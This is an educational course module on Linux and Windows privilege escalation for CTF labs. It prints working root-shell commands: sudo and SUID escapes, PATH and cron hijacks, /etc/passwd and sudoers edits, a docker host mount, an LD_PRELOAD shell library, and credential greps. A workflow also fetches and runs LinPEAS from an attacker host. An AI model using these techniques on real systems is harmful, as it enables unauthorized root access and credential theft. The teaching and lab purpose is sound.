# Privilege escalation

You've landed a shell. It's almost never the user you actually want. In a CTF, that means you're `www-data` or `bob` and the flag lives in `/root/`. In a real engagement, it means you're a service account on one host and you need domain-admin to write the report. **Privilege escalation** (privesc) is the discipline of turning the access you have into the access you need.

This module focuses on Linux — that's what shows up in 90% of CTFs and most of the boxes you'll hit on HackTheBox and TryHackMe. There's a short Windows section at the end. Cross-link: the SUID and cron lab challenges for this week are in [../../CTFs/week-05/privesc-suid/](../../CTFs/week-05/privesc-suid/) and [../../CTFs/week-05/cron-hint/](../../CTFs/week-05/cron-hint/) — practice everything you read here on those, and on TryHackMe's *Linux PrivEsc* room.

> **Authorized targets only.** Privesc techniques run with the explicit goal of breaking the host's security model. Doing this on a system you don't own is a felony under IT Act 2000 §43 (unauthorized access), §66 (computer-related offences), and §66F. Only run these against: your own VMs, course CTF containers, TryHackMe / HackTheBox while on their VPN, or systems with **written** permission. Even on a lab VM, do not run unfamiliar exploits without reading them first — kernel exploits in particular can crash the box and waste your time.

---

## The mental model

Privesc is **trust enumeration**, not magic. Linux's security model is a graph of trust: users trust groups, groups trust binaries, binaries trust their configuration, configuration trusts its file owner. Privesc is finding an edge in that graph that *shouldn't* exist — a writable cron script owned by root, a SUID binary that calls a relative path, a sudo entry someone forgot.

Two questions drive every privesc:

1. **What runs as root that I can influence?** (cron, services, SUID, sudo)
2. **What does root read that I can write?** (config files, scripts, library paths)

If you can answer either with a concrete example, you have a privesc. Every technique below is a specific shape of those questions.

---

## The enumeration phase

You can't escalate what you don't know exists. The first 10 minutes after every foothold should be enumeration — quiet, exhaustive, and saved.

### Quick orientation (run these first)

```bash
id                           # who am I, what groups am I in
sudo -l                      # what can I run as sudo (often the whole answer)
uname -a                     # kernel version
cat /etc/os-release          # distro and version
hostname                     # what to call this box in notes
whoami; pwd; date            # sanity check
```

`id` and `sudo -l` solve a startling number of CTF boxes immediately. Always check them first.

### Filesystem enumeration

```bash
# SUID and SGID binaries — anything outside the standard list is interesting
find / -perm -4000 -type f 2>/dev/null     # SUID
find / -perm -2000 -type f 2>/dev/null     # SGID
find / -perm -6000 -type f 2>/dev/null     # both

# Linux capabilities — finer-grained than SUID
getcap -r / 2>/dev/null

# Writable directories and files owned by root
find / -writable -type d 2>/dev/null | grep -v '/proc'
find / -user root -writable 2>/dev/null | head -50

# World-writable files
find / -perm -0002 -type f 2>/dev/null | head -50

# Recently modified files (last hour) — sometimes reveals what the box "does"
find / -mmin -60 -type f 2>/dev/null | grep -v '/proc\|/sys'

# Interesting filename patterns
find / -name "*.bak" -o -name "*.old" -o -name "*backup*" 2>/dev/null
find / -name "id_rsa" -o -name "*.kdbx" -o -name "*.pem" 2>/dev/null
```

### Process and service enumeration

```bash
# What's running and as whom
ps auxf

# Long-lived background tasks
ps -ef | grep -v "$$"

# Listening sockets (often reveals internal admin services on 127.0.0.1)
ss -tulpn

# Loaded kernel modules
lsmod
```

A service listening on `127.0.0.1` that you can reach because you're already inside is one of the most common privesc paths — a backup script's web UI on 127.0.0.1:8080 running as root, for example.

### Scheduled tasks

```bash
cat /etc/crontab
ls -la /etc/cron.{hourly,daily,weekly,monthly}/
ls -la /etc/cron.d/
crontab -l                   # current user's
sudo crontab -l 2>/dev/null  # root's, if you somehow got read access
systemctl list-timers --all  # systemd's modern cron replacement
```

### Environment and history

```bash
env                          # current env — sometimes has API keys, db creds
cat ~/.bash_history          # what did the previous user do?
cat /home/*/.bash_history 2>/dev/null
find / -name ".*history" 2>/dev/null
cat /var/mail/$(whoami) 2>/dev/null
```

Running the above by hand is tedious. The two scripts below automate it.

---

## Automated enumeration — LinPEAS, LinEnum, pspy

| Tool | What it does | Where to get it |
|------|--------------|-----------------|
| **LinPEAS** | Comprehensive colour-coded enumeration — SUID, sudo, cron, kernel, services, creds in files, network, exploit suggester. Highlights findings by likelihood. | [github.com/carlospolop/PEASS-ng](https://github.com/carlospolop/PEASS-ng) |
| **LinEnum** | Older, simpler enumeration script. Lighter output. | [github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum) |
| **pspy** | Userspace process snooper — shows commands executed by other users (including root's cron) without needing root. Static binary; brilliant for spotting cron jobs. | [github.com/DominicBreuker/pspy](https://github.com/DominicBreuker/pspy) |

Typical workflow on a lab target:

```bash
# From your attacker box, in the directory containing the binary
python3 -m http.server 8000

# On the target
cd /tmp
curl -O http://10.9.0.5:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh -a | tee /tmp/lp.log

# In another shell on the target
curl -O http://10.9.0.5:8000/pspy64
chmod +x pspy64
./pspy64
```

Read LinPEAS output top to bottom. Findings highlighted in red on yellow are "this is your privesc, probably."

> **Do not paste-and-run a random LinPEAS fork.** Carlos Polop maintains the canonical PEASS-ng repo. Mirrors and "improved" forks have been used in the past to ship miners and backdoors. Pin to the official release tag.

---

## Vector 1 — `sudo -l` misconfiguration

Almost free wins. `sudo -l` shows what the current user can run with sudo:

```bash
$ sudo -l
Matching Defaults entries for bob on box:
    env_reset, mail_badpass, secure_path=...

User bob may run the following commands on box:
    (ALL : ALL) NOPASSWD: /usr/bin/find
```

`bob` can run `find` as root without a password. `find` has a `-exec` flag. Therefore:

```bash
$ sudo find . -exec /bin/sh \; -quit
# id
uid=0(root) gid=0(root)
```

Done. This works for an enormous number of binaries — `vim`, `less`, `more`, `awk`, `python`, `perl`, `nmap`, `tar`, `man`, `git`, `find`, `tcpdump`, and dozens more.

The canonical reference: [**GTFOBins**](https://gtfobins.github.io/) — for each Unix binary, it lists the abuse paths under `Sudo`, `SUID`, `Capabilities`, etc. Always check there before assuming a sudo entry is harmless.

| `sudo -l` line | GTFOBins says |
|----------------|---------------|
| `(ALL) NOPASSWD: /usr/bin/vim` | `sudo vim -c ':!/bin/sh'` |
| `(ALL) NOPASSWD: /usr/bin/awk` | `sudo awk 'BEGIN {system("/bin/sh")}'` |
| `(ALL) NOPASSWD: /usr/bin/less` | `sudo less /etc/profile`, then `!/bin/sh` |
| `(ALL) NOPASSWD: /usr/bin/python3` | `sudo python3 -c 'import os; os.system("/bin/sh")'` |
| `(ALL) NOPASSWD: /usr/bin/tar` | `sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh` |

Always start a box with `sudo -l`.

---

## Vector 2 — SUID and SGID

A SUID bit on a binary means it runs as **its owner**, not as the user who invoked it. If a SUID binary owned by root contains an unsafe operation, you get root.

```bash
find / -perm -4000 -type f 2>/dev/null
```

The "standard" SUID set includes `/usr/bin/sudo`, `/usr/bin/passwd`, `/usr/bin/su`, `/usr/bin/mount`, `/usr/bin/newgrp`, `/usr/bin/chsh`, `/usr/bin/gpasswd`, `/usr/bin/chfn`, `/usr/bin/umount`, and a couple of `pkexec` / `ping` entries. **Anything outside that list deserves a look**:

- `/usr/bin/find` SUID → `find . -exec /bin/sh -p \; -quit`
- `/usr/bin/python` SUID → `python -c 'import os; os.execl("/bin/sh","sh","-p")'`
- `/usr/bin/vim.basic` SUID → `vim -c ':py3 import os; os.execl("/bin/sh","sh","-p")'`
- `/usr/bin/cp` SUID → overwrite `/etc/passwd` with a row whose UID is 0
- A custom `/opt/backup.sh` SUID → check what it calls (relative paths? unquoted?)

The `-p` flag on the new shell preserves the effective UID; without it, bash drops privileges back to your real UID. Always include `-p` when spawning a shell from a SUID context.

### Custom SUID binaries — relative path hijack

The CTF lab's [../../CTFs/week-05/privesc-suid/](../../CTFs/week-05/privesc-suid/) challenge ships a small script `escalate.sh` that prints the flag when run as root. In a more realistic version, you'd have a SUID binary that does something like:

```c
// /usr/local/bin/healthcheck (mode 4755, owner root)
#include <stdlib.h>
int main() {
    system("ps");
    return 0;
}
```

`ps` here is a **relative path** — it's resolved through `$PATH`. If you put your own `ps` earlier in `$PATH`, it runs as root:

```bash
echo -e '#!/bin/sh\n/bin/sh -p' > /tmp/ps
chmod +x /tmp/ps
export PATH=/tmp:$PATH
/usr/local/bin/healthcheck
# id
# uid=0(root)
```

Same idea applies to any cron script or service unit that calls binaries without absolute paths.

---

## Vector 3 — Linux capabilities

Capabilities are a finer-grained alternative to SUID: instead of "run as root," a binary gets just the specific permissions it needs (open low ports, read raw sockets, etc.). Misconfigured caps are as good as SUID.

```bash
getcap -r / 2>/dev/null
# /usr/bin/python3.10 = cap_setuid+ep   ← this is bad
```

`cap_setuid+ep` lets the binary set its UID to 0 even without SUID:

```bash
/usr/bin/python3.10 -c 'import os; os.setuid(0); os.system("/bin/sh")'
# id
# uid=0(root)
```

GTFOBins has a `Capabilities` section per binary. Treat any non-default cap on a non-standard binary as suspicious.

---

## Vector 4 — Cron job hijacking

Cron runs scheduled tasks as the user who owns the crontab — usually root for system jobs. If you can influence what a root-owned cron job does, you have root execution.

### Shape A — writable script

```bash
$ cat /etc/crontab
* * * * * root /opt/maintenance/cleanup.sh
$ ls -la /opt/maintenance/cleanup.sh
-rwxrwxrwx 1 root root 120 May 27 11:00 /opt/maintenance/cleanup.sh
$ echo 'cp /bin/bash /tmp/rb; chmod 4755 /tmp/rb' >> /opt/maintenance/cleanup.sh
$ # wait one minute
$ /tmp/rb -p
# id
# uid=0(root)
```

### Shape B — writable directory containing the script

Even if the script itself isn't writable, a writable *directory* can let you replace the file via rename. `mv` doesn't require write on the file — it requires write on the directory.

### Shape C — PATH-relative command in cron

The [../../CTFs/week-05/cron-hint/](../../CTFs/week-05/cron-hint/) file shows a system crontab entry:

```
* * * * * root echo csot26{...} > /tmp/csot_flag_hint
```

In the lab, that's literal — the entry writes the flag every minute. In a realistic version, you'd see something like `* * * * * root cleanup`, where `cleanup` is resolved through cron's PATH (`/usr/bin:/bin` by default). If `/usr/local/bin` is writable by you and earlier in cron's PATH (it usually isn't, but defaults vary by distro), drop your own `cleanup` there.

### Shape D — wildcards in cron commands

A cron entry like `* * * * * root tar czf /backup/home.tgz /home/*` is dangerous: `tar` interprets filenames starting with `--` as options. A file named `--checkpoint-action=exec=sh shell.sh` in `/home/bob/` makes tar execute `shell.sh` as root. Wildcard injection. See [GTFOBins for `tar`](https://gtfobins.github.io/gtfobins/tar/) for the full incantation.

### Spotting cron jobs you can't read

If `/etc/crontab` is restricted, `pspy` (above) shows every command cron runs in near-real-time without requiring root.

---

## Vector 5 — Writable system files

Sometimes the box hands you root directly through filesystem permissions.

### Writable `/etc/passwd`

If `/etc/passwd` is world-writable, you can append a new root-equivalent account. `/etc/passwd` still supports a legacy hash field that takes precedence over `/etc/shadow`:

```bash
# generate a hash for password "lab"
openssl passwd -1 lab
# $1$XXXX...

# append a new uid=0 user
echo 'pwn:$1$XXXX...:0:0:root:/root:/bin/bash' >> /etc/passwd
su pwn
# id → uid=0
```

### Writable `/etc/shadow`

Rarer, same idea — replace root's hash with a known one and `su -`.

### Writable `/etc/sudoers` or `/etc/sudoers.d/*`

`echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers` and you have passwordless sudo.

### NFS `no_root_squash`

If a remote NFS export is mounted with `no_root_squash`, root on the *client* maps to root on the *server*. Mount the share locally (as root on your own box), drop a SUID binary owned by root, and execute it on the target.

```bash
# attacker (root on own box)
mount -t nfs target:/exports /mnt/x
cat > /mnt/x/shell.c <<'EOF'
int main() { setuid(0); execl("/bin/sh","sh",NULL); }
EOF
gcc /mnt/x/shell.c -o /mnt/x/shell
chmod 4755 /mnt/x/shell
# target shell
/exports/shell
# id → uid=0
```

`showmount -e target` lists NFS exports; the `no_root_squash` flag is visible in `/etc/exports` on the server.

---

## Vector 6 — Dangerous group memberships

Some groups grant near-root power without an entry in `/etc/sudoers`. Check your `id` output for these:

| Group | Why it's dangerous |
|-------|--------------------|
| `docker` | Running a container with `-v /:/host` gives you the host filesystem as root |
| `lxd` | Similar to docker; spawn a privileged container that mounts the host |
| `disk` | Direct read access to block devices — `debugfs /dev/sda1` reads any file |
| `video` / `kvm` | Sometimes lets you read kernel memory |
| `adm` | Read access to `/var/log/*` — credentials in app logs |
| `sudo` / `wheel` | What you'd expect; `sudo -l` for the details |
| `shadow` | Read `/etc/shadow` directly → offline crack |

`docker` is the most common. The full one-liner:

```bash
docker run --rm -it -v /:/host alpine chroot /host /bin/bash
# id → root inside the host's filesystem
```

If you're in `docker`, you're effectively root.

---

## Vector 7 — `LD_PRELOAD` and environment abuse

If `sudo` is configured to preserve `LD_PRELOAD` (`Defaults env_keep += LD_PRELOAD` in sudoers), you can force any sudo-able program to load your library first:

```c
// /tmp/x.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() { unsetenv("LD_PRELOAD"); setresuid(0,0,0); system("/bin/bash -p"); }
```

```bash
gcc -fPIC -shared -nostartfiles -o /tmp/x.so /tmp/x.c
sudo LD_PRELOAD=/tmp/x.so any-allowed-command
# id → root
```

Other `env_keep` variables (`PYTHONPATH`, `PERL5LIB`, `LD_LIBRARY_PATH`) yield similar tricks per language.

---

## Vector 8 — Kernel exploits (last resort)

Old kernels have published CVEs with public PoCs. **Dirty COW** (CVE-2016-5195), **Dirty Pipe** (CVE-2022-0847), **PwnKit** (CVE-2021-4034), and **OverlayFS** (CVE-2021-3493) are the classics.

```bash
uname -a
# Linux box 4.4.0-31-generic ...   ← old enough for Dirty COW
```

Compare the kernel against [exploit-db.com](https://www.exploit-db.com) or [linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester):

```bash
./linux-exploit-suggester.sh -k 4.4.0-31-generic
```

> **Lab-only.** Kernel exploits can panic the host. They run as the very last attempt, on a target you can revert. Never run a kernel PoC on a production system, even with authorization, without the customer's explicit go-ahead and a rollback plan.

**PwnKit** is the friendliest one to know — it works on essentially every Linux distro from 2009 until 2022 because `polkit`'s SUID `pkexec` is everywhere. Public C and Python PoCs exist; running them on a vulnerable box gives a root shell in seconds.

---

## Vector 9 — Credentials lying around

Many privescs are just "the password was in a file." Always grep for them:

```bash
grep -r -i 'password' /etc/ 2>/dev/null | grep -v -i 'no_password\|password_required\|password_hash'
grep -r -i 'password\|passwd\|secret\|api_key' /var/www/ 2>/dev/null
find / -name '*.conf' -readable -exec grep -l -i 'password\|api[_-]\?key' {} \; 2>/dev/null
cat ~/.bash_history
cat /home/*/.bash_history 2>/dev/null
cat ~/.config/* 2>/dev/null
ls ~/.ssh/                # any keys to other hosts?
cat ~/.ssh/known_hosts    # what other hosts has this user visited?
```

Sloppy real-world admins leave creds in `wp-config.php`, `.env`, `database.yml`, `application.properties`, `connection.cfg`. If the same password is reused for root via `su`, you're done.

---

## Linux privesc — putting it together

The order I personally run on a fresh foothold:

```bash
# 1. quick wins (10 seconds each)
id
sudo -l
find / -perm -4000 -type f 2>/dev/null

# 2. orient the box
uname -a
cat /etc/os-release
hostname
ss -tulpn

# 3. drop LinPEAS / pspy from my attack box
python3 -m http.server 8000  # on attacker
curl -O http://10.9.0.5:8000/linpeas.sh; chmod +x linpeas.sh; ./linpeas.sh -a | tee lp.log

# 4. while LinPEAS runs, grep for creds
grep -r 'password\|api_key' /home /var/www /etc 2>/dev/null | head -50

# 5. pspy in another tab for 5 minutes to catch cron
./pspy64
```

By the time pspy has been running for five minutes, LinPEAS has finished, and you have a credential grep and a SUID/sudo list, the box is almost always solved. If not, kernel exploits are the last resort.

---

## Windows privesc — the short version

Most CSOT CTFs are Linux, but you'll meet Windows boxes on HackTheBox.

### Enumeration

```powershell
whoami /all
whoami /priv               # current privileges (SeImpersonate is gold)
net user                   # local users
net localgroup administrators
systeminfo                 # OS version, hotfixes
wmic qfe                   # installed patches
Get-Service                # services and states
Get-ScheduledTask
ipconfig /all
netstat -ano
```

[winPEAS](https://github.com/peass-ng/PEASS-ng) is the Windows counterpart to LinPEAS. Drop the EXE on target, run, read.

### Common Windows vectors

| Vector | Idea |
|--------|------|
| **SeImpersonatePrivilege / SeAssignPrimaryToken** | Service accounts often have these → `JuicyPotato`, `PrintSpoofer`, `RoguePotato` get you SYSTEM |
| **Unquoted service paths** | `C:\Program Files\Some App\service.exe` without quotes → drop `C:\Program.exe` and the service runs it as SYSTEM |
| **AlwaysInstallElevated** | Registry flag that runs all MSI installers as SYSTEM → `msiexec /i evil.msi` |
| **Weak service permissions** | `accesschk` shows services any user can reconfigure → set `binPath` to your shell |
| **Stored credentials** | `cmdkey /list`, `runas /savecred`, `Get-ChildItem -Path C:\Users -Filter *.kdbx -Recurse` |
| **Kernel exploits** | Same idea as Linux — `wmic qfe` shows missing patches → match to public CVEs |
| **Group membership** | Backup Operators, DnsAdmins, Server Operators all have documented privesc paths |

The [HackTricks Windows section](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation) is the canonical reference.

---

## Defender's view — what privesc leaves behind

Useful to know because (a) you'll write IR reports next module, and (b) staying quiet on a real engagement requires understanding what you're tripping.

| Action | Telemetry |
|--------|-----------|
| `sudo` invocation | `auth.log`, `journalctl _COMM=sudo` |
| New SUID binary | `auditd` (if configured), `aide` / `tripwire` integrity DB |
| `/etc/passwd` modified | File integrity monitoring; many EDRs alert on this |
| `pspy`/`linpeas` dropped to `/tmp` | EDR, file creation events, possibly AV signatures |
| Kernel exploit run | Kernel oops in `dmesg`, possible panic, audit |
| Cron edits | `cron.log`, `journalctl _COMM=cron` |
| Reverse shell to attacker IP | NetFlow/firewall logs, EDR network events, suricata IDS |

Doing privesc "silently" on a target with EDR is its own discipline — outside the scope of this course. Assume **everything is logged** in a real environment; the only question is who's watching.

---

## CTF tip — read everything that runs as root

Most CTF privesc challenges are solvable by literally `find / -user root \( -perm -4000 -o -perm -0002 \) -type f 2>/dev/null` and reading whatever shows up. The challenge author always plants something. The skill is recognising which of the things you found is the intentional vector vs the default SUID set. GTFOBins is the lookup table — for every Linux binary, it tells you if it's exploitable in a sudo/SUID/capabilities context.

---

## Further reading

- [HackTricks — Linux Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation) — the encyclopedia, bookmark it
- [GTFOBins](https://gtfobins.github.io/) — abuse paths per binary
- [PayloadsAllTheThings — Linux Privesc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
- [TryHackMe — Linux PrivEsc](https://tryhackme.com/room/linuxprivesc) — guided, friendly
- [TryHackMe — Linux PrivEsc Arena / Windows PrivEsc Arena](https://tryhackme.com/) — practice arenas
- [LinPEAS source](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) — read it to understand what it checks for
- [g0tmi1k — Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/) — the original 2011 post that taught a generation

---

## Next module

[post-exploitation.md](post-exploitation.md) — Once you're root, the engagement isn't over. Next we cover what to do with that privilege: situational awareness, stable shells, pivoting, and credential harvesting.
